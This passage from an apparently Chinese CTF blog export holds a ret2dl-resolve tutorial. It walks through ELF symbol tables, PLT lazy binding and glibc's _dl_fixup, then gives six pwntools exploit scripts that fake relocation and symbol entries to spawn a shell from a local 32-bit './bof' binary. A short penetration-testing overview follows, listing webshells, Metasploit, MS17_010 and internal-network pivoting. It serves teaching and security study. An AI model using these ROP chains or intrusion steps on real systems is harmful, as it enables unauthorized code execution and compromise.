*/ Elf32_Addr st_value; /* Symbol value */ Elf32_Word st_size; /* Symbol size */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf32_Section st_shndx; /* Section index */&#125; Elf32_Sym;typedef struct&#123; Elf64_Word st_name; /* Symbol name (string tbl index) */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility */ Elf64_Section st_shndx; /* Section index */ Elf64_Addr st_value; /* Symbol value */ Elf64_Xword st_size; /* Symbol size */&#125; Elf64_Sym; .dynsym节包含了动态链接符号表。Elf32_Sym[num]中的num对应着ELF32_R_SYM(Elf32_Rel-&gt;r_info) 以read为例，read的索引值为ELF32_R_SYM(Elf32_Rel-&gt;r_info)=ELF32_R_SYM(0x00000207)=0x00000207&gt;&gt;8=2，所以Elf32_Sym[2]保存着read的符号表信息 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192λ readelf -s ./bofSymbol table '.dynsym' contains 10 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FUNC GLOBAL DEFAULT UND setbuf@GLIBC_2.0 (2) 2: 00000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.0 (2) 3: 00000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 4: 00000000 0 FUNC GLOBAL DEFAULT UND strlen@GLIBC_2.0 (2) 5: 00000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.0 (2) 6: 00000000 0 FUNC GLOBAL DEFAULT UND write@GLIBC_2.0 (2) 7: 0804a044 4 OBJECT GLOBAL DEFAULT 26 stdout@GLIBC_2.0 (2) 8: 0804864c 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used 9: 0804a040 4 OBJECT GLOBAL DEFAULT 26 stdin@GLIBC_2.0 (2)Symbol table '.symtab' contains 75 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 08048154 0 SECTION LOCAL DEFAULT 1 2: 08048168 0 SECTION LOCAL DEFAULT 2 3: 08048188 0 SECTION LOCAL DEFAULT 3 4: 080481ac 0 SECTION LOCAL DEFAULT 4 5: 080481d8 0 SECTION LOCAL DEFAULT 5 6: 08048278 0 SECTION LOCAL DEFAULT 6 7: 080482e4 0 SECTION LOCAL DEFAULT 7 8: 080482f8 0 SECTION LOCAL DEFAULT 8 9: 08048318 0 SECTION LOCAL DEFAULT 9 10: 08048330 0 SECTION LOCAL DEFAULT 10 11: 08048358 0 SECTION LOCAL DEFAULT 11 12: 08048380 0 SECTION LOCAL DEFAULT 12 13: 080483e0 0 SECTION LOCAL DEFAULT 13 14: 080483f0 0 SECTION LOCAL DEFAULT 14 15: 08048634 0 SECTION LOCAL DEFAULT 15 16: 08048648 0 SECTION LOCAL DEFAULT 16 17: 08048650 0 SECTION LOCAL DEFAULT 17 18: 08048684 0 SECTION LOCAL DEFAULT 18 19: 08049f08 0 SECTION LOCAL DEFAULT 19 20: 08049f0c 0 SECTION LOCAL DEFAULT 20 21: 08049f10 0 SECTION LOCAL DEFAULT 21 22: 08049f14 0 SECTION LOCAL DEFAULT 22 23: 08049ffc 0 SECTION LOCAL DEFAULT 23 24: 0804a000 0 SECTION LOCAL DEFAULT 24 25: 0804a020 0 SECTION LOCAL DEFAULT 25 26: 0804a040 0 SECTION LOCAL DEFAULT 26 27: 00000000 0 SECTION LOCAL DEFAULT 27 28: 00000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 29: 08049f10 0 OBJECT LOCAL DEFAULT 21 __JCR_LIST__ 30: 08048430 0 FUNC LOCAL DEFAULT 14 deregister_tm_clones 31: 08048460 0 FUNC LOCAL DEFAULT 14 register_tm_clones 32: 080484a0 0 FUNC LOCAL DEFAULT 14 __do_global_dtors_aux 33: 0804a048 1 OBJECT LOCAL DEFAULT 26 completed.7209 34: 08049f0c 0 OBJECT LOCAL DEFAULT 20 __do_global_dtors_aux_fin 35: 080484c0 0 FUNC LOCAL DEFAULT 14 frame_dummy 36: 08049f08 0 OBJECT LOCAL DEFAULT 19 __frame_dummy_init_array_ 37: 00000000 0 FILE LOCAL DEFAULT ABS bof.c 38: 00000000 0 FILE LOCAL DEFAULT ABS crtstuff.c 39: 08048774 0 OBJECT LOCAL DEFAULT 18 __FRAME_END__ 40: 08049f10 0 OBJECT LOCAL DEFAULT 21 __JCR_END__ 41: 00000000 0 FILE LOCAL DEFAULT ABS 42: 08049f0c 0 NOTYPE LOCAL DEFAULT 19 __init_array_end 43: 08049f14 0 OBJECT LOCAL DEFAULT 22 _DYNAMIC 44: 08049f08 0 NOTYPE LOCAL DEFAULT 19 __init_array_start 45: 08048650 0 NOTYPE LOCAL DEFAULT 17 __GNU_EH_FRAME_HDR 46: 0804a000 0 OBJECT LOCAL DEFAULT 24 _GLOBAL_OFFSET_TABLE_ 47: 08048630 2 FUNC GLOBAL DEFAULT 14 __libc_csu_fini 48: 00000000 0 FUNC GLOBAL DEFAULT UND setbuf@@GLIBC_2.0 49: 00000000 0 FUNC GLOBAL DEFAULT UND read@@GLIBC_2.0 50: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterTMCloneTab 51: 08048420 4 FUNC GLOBAL HIDDEN 14 __x86.get_pc_thunk.bx 52: 0804a020 0 NOTYPE WEAK DEFAULT 25 data_start 53: 080484eb 52 FUNC GLOBAL DEFAULT 14 vuln 54: 0804a028 0 NOTYPE GLOBAL DEFAULT 25 _edata 55: 08048634 0 FUNC GLOBAL DEFAULT 15 _fini 56: 0804a020 0 NOTYPE GLOBAL DEFAULT 25 __data_start 57: 00000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 58: 0804a024 0 OBJECT GLOBAL HIDDEN 25 __dso_handle 59: 0804864c 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used 60: 00000000 0 FUNC GLOBAL DEFAULT UND strlen@@GLIBC_2.0 61: 00000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@@GLIBC_ 62: 00000000 0 FUNC GLOBAL DEFAULT UND write@@GLIBC_2.0 63: 080485d0 93 FUNC GLOBAL DEFAULT 14 __libc_csu_init 64: 0804a040 4 OBJECT GLOBAL DEFAULT 26 stdin@@GLIBC_2.0 65: 0804a04c 0 NOTYPE GLOBAL DEFAULT 26 _end 66: 080483f0 0 FUNC GLOBAL DEFAULT 14 _start 67: 08048648 4 OBJECT GLOBAL DEFAULT 16 _fp_hw 68: 0804a044 4 OBJECT GLOBAL DEFAULT 26 stdout@@GLIBC_2.0 69: 0804a028 0 NOTYPE GLOBAL DEFAULT 26 __bss_start 70: 0804851f 165 FUNC GLOBAL DEFAULT 14 main 71: 00000000 0 NOTYPE WEAK DEFAULT UND _Jv_RegisterClasses 72: 0804a028 0 OBJECT GLOBAL HIDDEN 25 __TMC_END__ 73: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMCloneTable 74: 08048358 0 FUNC GLOBAL DEFAULT 11 _init .dynstr节包含了动态链接的字符串。这个节以\\x00作为开始和结尾，中间每个字符串也以\\x00间隔 12345678910111213assassinq&gt;&gt; x/12s 0x080482780x8048278: &quot;&quot;0x8048279: &quot;libc.so.6&quot;0x8048283: &quot;_IO_stdin_used&quot;0x8048292: &quot;stdin&quot;0x8048298: &quot;strlen&quot;0x804829f: &quot;read&quot;0x80482a4: &quot;stdout&quot;0x80482ab: &quot;setbuf&quot;0x80482b2: &quot;__libc_start_main&quot;0x80482c4: &quot;write&quot;0x80482ca: &quot;__gmon_start__&quot;0x80482d9: &quot;GLIBC_2.0&quot; Elf32_Sym[2]-&gt;st_name=0x27（.dynsym + Elf32_Sym_size * num），所以.dynstr加上0x27的偏移量，就是字符串read 1234assassinq&gt;&gt; x/wx 0x080481d8+0x10*20x80481f8: 0x00000027assassinq&gt;&gt; x/s 0x08048278+0x270x804829f: &quot;read&quot; .plt节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置（.plt + Elf32_Sym_size * num） 1234assassinq&gt;&gt; x/3i 0x08048380+0x10*2 0x80483a0 &lt;read@plt&gt;: jmp DWORD PTR ds:0x804a010 0x80483a6 &lt;read@plt+6&gt;: push 0x8 0x80483ab &lt;read@plt+11&gt;: jmp 0x8048380 Lazy Binding在程序执行的过程中，可能有些引入的 C 库函数到结束时都不会执行。所以 ELF 采用延迟绑定的技术，在第一次调用 C 库函数时才会去寻找真正的位置进行绑定 当程序执行call read@plt时，实际会跳到0x804a010去执行。而0x080483a0处的汇编代码仅仅三行，第一行中0x804a010为read的 GOT 表位置，第一次调用read时，对应的 GOT 表中并没有放read的真实地址，而是read@plt的下一条指令地址； 12assassinq&gt;&gt; x/wx 0x804a0100x804a010: 0x080483a6 第二行和第三行把reloc_arg=0x8作为参数放进栈里，然后跳到0x8048380（PLT[0]）继续执行； 123assassinq&gt;&gt; x/2i 0x080483a6 0x80483a6 &lt;read@plt+6&gt;: push 0x8 0x80483ab &lt;read@plt+11&gt;: jmp 0x8048380 接下来PLT[0]再把link_map=*(GOT+4)（即GOT[1]，链接器的标识信息）作为参数推入栈中，而*(GOT+8)（即GOT[2]，动态链接器中的入口点）中保存的是_dl_runtime_resolve函数的地址； 123assassinq&gt;&gt; x/2i 0x8048380 0x8048380: push DWORD PTR ds:0x804a004 0x8048386: jmp DWORD PTR ds:0x804a008 因此以上指令相当于执行了_dl_runtime_resolve(link_map, reloc_arg)，该函数会完成符号的解析，即将真实的read函数地址写入其GOT条目中，随后把控制权交给read函数 1234567891011121314assassinq&gt;&gt; x/wx 0x804a0080x804a008: 0xf7fee000assassinq&gt;&gt; x/11i 0xf7fee000 0xf7fee000 &lt;_dl_runtime_resolve&gt;: push eax 0xf7fee001 &lt;_dl_runtime_resolve+1&gt;: push ecx 0xf7fee002 &lt;_dl_runtime_resolve+2&gt;: push edx 0xf7fee003 &lt;_dl_runtime_resolve+3&gt;: mov edx,DWORD PTR [esp+0x10] 0xf7fee007 &lt;_dl_runtime_resolve+7&gt;: mov eax,DWORD PTR [esp+0xc] 0xf7fee00b &lt;_dl_runtime_resolve+11&gt;: call 0xf7fe77e0 &lt;_dl_fixup&gt; 0xf7fee010 &lt;_dl_runtime_resolve+16&gt;: pop edx 0xf7fee011 &lt;_dl_runtime_resolve+17&gt;: mov ecx,DWORD PTR [esp] 0xf7fee014 &lt;_dl_runtime_resolve+20&gt;: mov DWORD PTR [esp],eax 0xf7fee017 &lt;_dl_runtime_resolve+23&gt;: mov eax,DWORD PTR [esp+0x4] 0xf7fee01b &lt;_dl_runtime_resolve+27&gt;: ret 0xc _dl_fixup在dl-runtime.c中实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif struct link_map *l, ElfW(Word) reloc_arg)&#123; const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目 const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; const ElfW(Sym) *refsym = sym; void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset); lookup_t result; DL_FIXUP_VALUE_TYPE value; /* Sanity check that we're really looking at a PLT relocation. */// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7 assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); /* Look up the target symbol. If the normal lookup rules are not used don't look in the global scope. */ if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) &#123; const struct r_found_version *version = NULL; if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) &#123; const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff; version = &amp;l-&gt;l_versions[ndx]; if (version-&gt;hash == 0) version = NULL; &#125; /* We need to keep the scope around so do some locking. This is not necessary for objects which cannot be unloaded or when we are not using any threads (yet). */ int flags = DL_LOOKUP_ADD_DEPENDENCY; if (!RTLD_SINGLE_THREAD_P) &#123; THREAD_GSCOPE_SET_FLAG (); flags |= DL_LOOKUP_GSCOPE_LOCK; &#125;#ifdef RTLD_ENABLE_FOREIGN_CALL RTLD_ENABLE_FOREIGN_CALL;#endif// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址 result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); /* We are done with the global scope. */ if (!RTLD_SINGLE_THREAD_P) THREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL RTLD_FINALIZE_FOREIGN_CALL;#endif /* Currently result contains the base load address (or link map) of the object that defines sym. Now add in the symbol offset. */// value为libc基址加上要解析函数的偏移地址，也即实际地址 value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, false)); &#125; else &#123; /* We already found the symbol. The module (and therefore its load address) is also known. */ value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true)); result = l; &#125; /* And now perhaps the relocation addend. */ value = elf_machine_plt_value (l, reloc, value); if (sym != NULL &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0)) value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value)); /* Finally, fix up the plt itself. */ if (__glibc_unlikely (GLRO(dl_bind_not))) return value;// 最后把value写入相应的GOT表条目中 return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);&#125; Pwned One by One 控制eip为PLT[0]的地址，只需传递一个index_arg参数 控制index_arg的大小，使reloc的位置落在可控地址（比如.bss段）内 伪造reloc的内容，使sym落在可控地址（比如.bss段）内 伪造sym的内容，使name落在可控地址（比如.bss段）内 伪造name为任意库函数，比如说system 接下来一步一步地实现对dl-resolve的利用 Step one先实现一个 ROP 直接返回write@plt，然后输出我们设定的参数 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'payload = flat([ write_plt, 0xdeadbeef, 1, buf + 80, len(cmd)])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 最后会输出buf + 80上的字符串/bin/sh： 123456789101112λ ./exp.py[+] Starting local process './bof': pid 7067[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode/bin/sh[*] Got EOF while reading in interactive$ Step Two第二次直接返回PLT[0]，要带上write的index_offset。 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'plt_0 = 0x08048380 # objdump -d -j .plt ./bofindex_offset = 0x20payload = flat([ plt_0, index_offset, 0xdeadbeef, 1, buf + 80, len(cmd)])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 最后同样也是输出/bin/sh： 123456789101112λ ./exp.py[+] Starting local process './bof': pid 7270[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode/bin/sh[*] Got EOF while reading in interactive$ Step Three接下来我们在.bss上构造假的reloc，并让dl-runtime.c来解析： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']write_got = elf.got['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'plt_0 = 0x08048380 # objdump -d -j .plt ./bofrel_plt = 0x8048330 # objdump -s -j .rel.plt ./bofindex_offset = (buf + 24)- rel_pltr_info = 0x607fake_reloc = p32(write_got) + p32(r_info)payload = flat([ plt_0, index_offset, 0xdeadbeef, 1, buf + 80, len(cmd), fake_reloc])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 最后得到相同的结果： 123456789101112λ ./exp.py[+] Starting local process './bof': pid 8237[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode/bin/sh[*] Got EOF while reading in interactive$ Step Four这一次构造假的.sym，使其指向我们控制的st_name 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#!/usr/bin/env pythonfrom pwn import *context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']write_got = elf.got['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'plt_0 = 0x08048380 # objdump -d -j .plt ./bofrel_plt = 0x8048330 # objdump -s -j .rel.plt ./bofindex_offset = (buf + 24)- rel_pltdynsym = 0x080481d8 # readelf -S ./bof | grep \".dynsym\"dynstr = 0x08048278 # readelf -S ./bof | grep \".dynstr\"fake_sym_addr = buf + 32align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr += alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = 0x4cfake_sym = flat([ st_name, 0, 0, 0x12])payload = flat([ plt_0, index_offset, 0xdeadbeef, 1, buf + 80, len(cmd), fake_reloc, 'A' * align, fake_sym])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 因为dynsym里的Elf32_Sym结构体都是0x10字节大小，所以这里需要对齐操作；因为Elf32_Sym结构体的大小为0x10，所以要除以0x10才能得到write的dynsym索引号。最后成功运行： 123456789101112λ ./exp.py[+] Starting local process './bof': pid 9736[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode/bin/sh[*] Got EOF while reading in interactive$ Step Five接下来一步把st_name指向输入的字符串&quot;write&quot;： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pythonfrom pwn import *context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']write_got = elf.got['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'plt_0 = 0x08048380 # objdump -d -j .plt ./bofrel_plt = 0x8048330 # objdump -s -j .rel.plt ./bofindex_offset = (buf + 24)- rel_pltdynsym = 0x080481d8 # readelf -S ./bof | grep \".dynsym\"dynstr = 0x08048278 # readelf -S ./bof | grep \".dynstr\"fake_sym_addr = buf + 32align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr += alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrfake_sym = flat([ st_name, 0, 0, 0x12])payload = flat([ plt_0, index_offset, 0xdeadbeef, 1, buf + 80, len(cmd), fake_reloc, 'A' * align, fake_sym, 'write\\x00'])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 中间stname的位置因为Elf32_Sym的大小为0x10，所以要加0x10。结果成功： 123456789101112λ ./exp.py[+] Starting local process './bof': pid 9778[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode/bin/sh[*] Got EOF while reading in interactive$ Step Six最后一步将write改成system，同时设置一下system的参数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/env pythonfrom pwn import *context.arch = 'i386'p = process('./bof')elf = ELF('./bof')g = lambda x: next(elf.search(asm(x)))write_plt = elf.plt['write']write_got = elf.got['write']read_plt = elf.plt['read']pop_ebp_ret = g('pop ebp ; ret')leave_ret = g('leave ; ret')bss = 0x0804a040 # readelf -S ./bof | grep \".bss\"buf = bss + 0x800pop_pop_pop_ret = 0x08048629 # ROPgadget --binary ./bof --only \"pop|ret\"# raw_input('@')offset = 112p.recvuntil('Return to dl_runtime_resolve!')payload = flat([ 'A' * offset, read_plt, pop_pop_pop_ret, 0, buf, 100, pop_ebp_ret, buf - 4, leave_ret])p.sendline(payload)# raw_input('@')cmd = '/bin/sh'plt_0 = 0x08048380 # objdump -d -j .plt ./bofrel_plt = 0x8048330 # objdump -s -j .rel.plt ./bofindex_offset = (buf + 24)- rel_pltdynsym = 0x080481d8 # readelf -S ./bof | grep \".dynsym\"dynstr = 0x08048278 # readelf -S ./bof | grep \".dynstr\"fake_sym_addr = buf + 32align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr += alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrfake_sym = flat([ st_name, 0, 0, 0x12])payload = flat([ plt_0, index_offset, 0xdeadbeef, buf + 80, 0xdeadbeef, 0xdeadbeef, fake_reloc, 'A' * align, fake_sym, 'system\\x00'])payload = payload.ljust(80, 'A')payload += cmd + '\\x00'payload = payload.ljust(100, 'A')p.sendline(payload)p.interactive() 成功 Get Shell： 1234567891011121314λ ./exp.py[+] Starting local process './bof': pid 9948[*] '/home/assassinq/Desktop/ret2dl-resolve/bof' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)[*] Switching to interactive mode$ lsbof bof.c core exp.py Makefile peda-session-bof.txt$ iduid=1000(assassinq) gid=1000(assassinq) groups=1000(assassinq),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker) Complement: 64 bit64 位下的利用相较于 32 位下有一些不同，像是一些结构体发生变化，如Elf64_Rela，还有其他的都在这篇文章中都详细地介绍了 Referenceshttp://pwn4.fun/2016/11/09/Return-to-dl-resolve/http://www.inforsec.org/wp/?p=389http://drops.wooyun.org/binary/14360http://rk700.github.io/2015/08/09/return-to-dl-resolve/http://phrack.org/issues/58/4.html#article","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"渗透测试基础指南","slug":"渗透测试基础指南","date":"2019-08-04T08:17:53.000Z","updated":"2019-08-26T05:55:08.042Z","comments":true,"path":"2019/08/04/渗透测试基础指南/","link":"","permalink":"qianfei11.coding.me/2019/08/04/渗透测试基础指南/","excerpt":"记录一下渗透测试的基础步骤。","text":"记录一下渗透测试的基础步骤。 Penetration test渗透测试即利用我们所掌握的渗透知识，对网站进行一步一步的渗透，发现其中存在的漏洞和隐藏的风险，然后撰写一篇测试报告，提供给客户。客户根据我们撰写的测试报告，对网站进行漏洞修补，以防止黑客的入侵。 渗透测试的前提是经过用户的授权，才可以对网站进行渗透。如果我们没有经过客户的授权而对一个网站进行渗透测试的话是违法的。2016 年 6 月 1 日，我国颁布了《中华人民共和国网络安全法》，对网络犯罪有了法律约束。 渗透测试分为白盒测试和黑盒测试： 白盒测试：在知道目标网站源码和其他一些信息的情况下对其进行渗透，有点类似于代码审计 黑盒测试：只告诉我们这个网站的 url，其他什么都不告诉，模拟黑客对网站的渗透 接下来记录一下黑盒测试的几个步骤 Information Gathering（信息收集） 主动信息收集：通过直接访问、扫描网站，这种流量将流经网站 被动信息收集：利用第三方的服务对目标进行访问了解，比例：Google 搜索、Shodan 搜索等 DNS 域名信息的收集 整站分析 服务器类型(Linux/Windows) 网站容器(Apache/Nginx/Tomcat/IIS) 脚本类型(php/jsp/asp/aspx) 数据库类型(Mysql/Oracle/Accees/Mqlserver) 主机扫描(Nessus) 端口扫描(nmap) 网站敏感目录和文件 旁站和 C 段扫描 网站漏洞扫描 Vulnerability Detection（漏洞探测）探测网站是否存在一些常见的 Web 漏洞： SQL 注入 XSS 跨站脚本 CSRF 跨站请求伪造 XXE 漏洞 SSRF 服务端请求伪造漏洞 文件包含漏洞 文件上传漏洞 文件解析漏洞 远程代码执行漏洞 CORS 跨域资源共享漏洞 越权访问漏洞 目录浏览漏洞和任意文件读取/下载漏洞 struts2 漏洞 JAVA 反序列化漏洞 … Vulnerability Exploitation（漏洞利用）当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的 webshell，我们往往需要结合几个漏洞来拿 webshell。 SQL 注入：Sqlmap XSS 跨站脚本：BeEF 抓包改包工具：Burpsuite、Fidder 文件上传漏洞：上传一句话木马，进而获得 webshell 提权：获得了 webshell 后，一般权限很低，所以需要提权，可以选择反弹一个 MSF 类型的 shell 提权，也可以使用其他提权（Windows 提权、Linux 下用 SUID 提权） Intranet forwarding（内网转发）当我们获取到了网站的 Webshell 之后，如果我们是想获取该主机的有关信息，我们可以将该主机的 webshell 换成 MSF 的 shell。直接生成一个木马，然后在菜刀中执行该木马，我们就能接收到一个 MSF 类型的 shell。 如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发。我们不能直接和内网的主机通信，所以就需要借助获取到的 webshell 网站的服务器和内网主机进行通信。 Intranet Penetration（内网渗透）当能跟内网主机进行通信后，就可以开始进行内网渗透。可以先使用nmap对内网主机进行扫描，探测在线的主机，并且探测其使用的操作系统、开放的端口等信息。 内网用户基本都是使用的 windows 系统，而且大多数是使用的 windows7，在 windows7 中有很多漏洞，比如 MS17_010 这种漏洞，我们可以使用Metasploit Framework探测其 windows 系统是否存在这种漏洞，如果有这种漏洞，直接拿 shell。 企业内网大多数是一个域环境，所以我们只需要找到域控服务器，并拿下其权限，就可以登录其他所有用户的主机。 当然，内网中也有可能存在供内网使用的内网服务器，我们可以进一步渗透拿下其权限。 Report 